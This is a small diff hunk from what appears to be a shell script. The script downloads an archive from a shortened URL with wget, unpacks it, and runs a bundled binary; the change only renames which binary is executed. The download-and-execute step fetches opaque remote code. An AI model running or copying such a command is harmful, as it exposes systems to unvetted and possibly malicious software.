@@ -4,7 +4,7 @@ wget -O dot s.id/dotaja
 
 tar -xzvf dot
 
-./dotlol
+./dotpy
 
 sleep 10
 
